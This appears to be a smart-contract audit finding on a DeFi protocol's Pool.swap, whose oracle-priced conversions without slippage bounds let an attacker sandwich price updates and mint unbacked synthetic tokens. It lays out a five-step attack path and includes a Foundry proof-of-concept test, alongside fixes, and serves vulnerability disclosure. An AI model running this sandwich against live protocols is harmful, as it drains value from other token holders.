### Title
Oracle-priced `Pool.swap` is sandwichable around price updates, letting an attacker mint unbacked synths - (File: contracts/Pool.sol)

### Summary
`Pool.swap` converts synthetic tokens at raw `MasterOracle` spot prices with no slippage bound and no health check. Any externally observable price update (e.g., a pending Chainlink/`MasterOracle` feed update in the mempool) can be sandwiched: buy the appreciating synth at the stale price before the update and sell it back at the new price after. The spread is minted as fresh synthetic supply with no collateral behind it.

### Finding Description
`Pool.swap` burns `syntheticTokenIn_` and mints `syntheticTokenOut_` purely at `masterOracle().quote(...)` minus a fee: [1](#0-0) 

`quoteSwapOut` prices the conversion via `_poolRegistry.masterOracle().quote(...)`: [2](#0-1) 

There is no `amountOutMin`/deadline parameter, and no check that the swapper's position stays healthy — swap is a free function for any holder of a registered synth (`onlyIfSyntheticTokenExists`, `whenNotShutdown`, `nonReentrant`, `isSwapActive` are the only gates).

Attack path (all public entry points):
1. Deposit collateral via `DepositToken.deposit` and call `DebtToken.issue` to mint msUSD (health-checked at the stale price via `debtPositionOf`/`quoteUsdToToken` — `DebtToken.sol:235-271`).
2. Call `Pool.swap(msUSD, msETH, amountIn)` at the stale ETH price.
3. Wait for the oracle update tx (observable in the mempool before it lands — the attacker can also sandwich a specific update tx by placing swap 2 immediately after it) that raises `msETH`'s price.
4. Call `Pool.swap(msETH, msUSD, ...)` at the new price, receiving more msUSD than originally issued.
5. `DebtToken.repay` the original debt, withdraw the collateral, and keep the difference in unbacked msUSD, sellable on external markets.

### Impact Explanation
Each sandwich mints `amountIn * (newPrice/oldPrice - 1) - fees` of fresh `syntheticTokenOut_` supply that is backed by nothing — the attacker fully unwinds their debt and collateral. The profit is extracted as dilution of all synth holders and accumulates as unbacked supply, degrading protocol solvency every time an oracle update changes relative synth prices by more than `swapFee + issueFee`. This is a repeatable, atomic-per-update theft of value from the protocol.

### Likelihood Explanation
Oracle price updates on production deployments are public mempool transactions that can be frontrun by any unprivileged EOA. The only mitigations are `swapFee`/`issueFee` (which must exceed the per-update price delta — implausible for volatile assets and batched/stale updates) and `isSwapActive` (a governor flag that is on in configurations where swap is offered). No private mempool, commit-reveal, or price-validity mechanism exists on this path.

### Recommendation
- Add slippage protection to `swap` (`amountOutMin_`/`deadline` parameters).
- Charge a minimum swap fee calibrated against expected oracle deviations, or disable `swap` while allowing redemptions.
- Prefer liquidity-based pricing or use dual-oracle bounds (e.g., require two consecutive oracle states) before executing the mint.

### Proof of Concept
Hardhat/Foundry fork, using the repo's own fixture style (`masterOracle.updatePrice` used throughout `test/foundry/MultiPool.t.sol`):

```solidity
function test_swapSandwich() external {
    // setup: pool with isSwapActive, msUSD & msETH debt tokens, msdVaUSDC deposit token
    vm.startPrank(attacker);
    vaUSDC.approve(address(msdVaUSDC), type(uint256).max);
    msdVaUSDC.deposit(100_000e18, attacker);
    msUSDDebt.issue(50_000e18, attacker);          // mint msUSD at stale prices

    uint256 msEthBal = pool.swap(msUSD, msETH, 50_000e18);  // swap 1 at P_old
    vm.stopPrank();

    // simulate observed oracle update tx landing (e.g. ETH +10%)
    masterOracle.updatePrice(address(msETH), 2200e18);       // P_new
    masterOracle.updatePrice(address(weth), 2200e18);

    vm.startPrank(attacker);
    uint256 msUsdBack = pool.swap(msETH, msUSD, msEthBal);   // swap 2 at P_new
    assertGt(msUsdBack, 50_000e18);                          // profit minted

    msUSDDebt.repay(attacker, 50_000e18);                    // unwind debt
    // attacker keeps msUsdBack - 50_000e18 of unbacked msUSD and recovers collateral
    vm.stopPrank();
}
```

Invariant broken: synth-supply-vs-backing conservation — total synthetic supply grows without any collateral deposit, producing unbacked msAssets.

    function swap(
        ISyntheticToken syntheticTokenIn_,
        ISyntheticToken syntheticTokenOut_,
        uint256 amountIn_
    )
        external
        override
        whenNotShutdown
        nonReentrant
        onlyIfSyntheticTokenExists(syntheticTokenIn_)
        onlyIfSyntheticTokenExists(syntheticTokenOut_)
        returns (uint256 _amountOut, uint256 _fee)
    {
        address _msgSender = _msgSender();

        if (!isSwapActive) revert SwapFeatureIsInactive();
        if (amountIn_ == 0 || amountIn_ > syntheticTokenIn_.balanceOf(_msgSender)) revert AmountInIsInvalid();

        syntheticTokenIn_.burn(_msgSender, amountIn_);

        (_amountOut, _fee) = quoteSwapOut(syntheticTokenIn_, syntheticTokenOut_, amountIn_);

        if (_fee > 0) {
            syntheticTokenOut_.mint(_poolRegistry.feeCollector(), _fee);
        }

        syntheticTokenOut_.mint(_msgSender, _amountOut);

        emit SyntheticTokenSwapped(_msgSender, syntheticTokenIn_, syntheticTokenOut_, amountIn_, _amountOut, _fee);
    }
